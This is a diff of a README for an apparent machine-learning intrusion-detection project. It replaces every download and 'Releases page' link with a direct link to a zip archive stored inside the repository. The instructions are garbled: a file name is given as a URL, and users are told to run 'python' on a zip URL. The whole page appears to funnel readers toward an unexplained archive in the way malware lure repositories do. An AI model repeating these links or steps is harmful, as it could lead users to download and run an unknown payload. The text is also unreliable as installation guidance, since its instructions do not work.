@@ -1,6 +1,6 @@
 # 🚀 network-intrusion-detection-ml - Protect Your Network with AI
 
-[![Download](https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip)](https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip)
+[![Download](https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip)](https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip)
 
 ## 📋 Description
 
@@ -40,11 +40,11 @@ Before downloading, ensure that your system meets the following requirements:
 
 To get started with the network-intrusion-detection-ml application, follow these steps:
 
-1. Click on the **Download** button at the top of the page, or visit the [Releases page](https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip) to find the latest version of the application.
+1. Click on the **Download** button at the top of the page, or visit the [Releases page](https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip) to find the latest version of the application.
    
 2. Once on the Releases page, locate the appropriate version and click on it. You will see different assets available for download.
 
-3. Select the file that matches your operating system. The file may have a name like `https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip`.
+3. Select the file that matches your operating system. The file may have a name like `https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip`.
 
 4. After the download is complete, navigate to the downloaded file on your computer.
 
@@ -57,18 +57,18 @@ To get started with the network-intrusion-detection-ml application, follow these
 8. Run the application by entering the command:  
 
    ```
-   python https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip
+   python https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip
    ```
 
 ## 📥 Download & Install
 
-To download the application, you can visit the following link for the latest release: [Download Here](https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip).
+To download the application, you can visit the following link for the latest release: [Download Here](https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip).
 
 Once you have downloaded and installed the application, you can run it as described in the Getting Started section.
 
 ## 🛡️ Using the Application
 
-1. After running `https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip`, open your web browser.
+1. After running `https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip`, open your web browser.
    
 2. Go to `http://localhost:8000` to access the real-time analysis dashboard.
 
@@ -96,4 +96,4 @@ We welcome contributions from the community. If you wish to support the project,
 
 This project is licensed under the MIT License. You can view the license details in the LICENSE file in the repository.
 
-For more information, check the [Releases page](https://raw.githubusercontent.com/shenal00/network-intrusion-detection-ml/main/data/network-intrusion-detection-ml-palaeographist.zip) for downloads and updates.
+For more information, check the [Releases page](https://github.com/shenal00/network-intrusion-detection-ml/raw/refs/heads/main/src/ml_network_detection_intrusion_v2.8.zip) for downloads and updates.
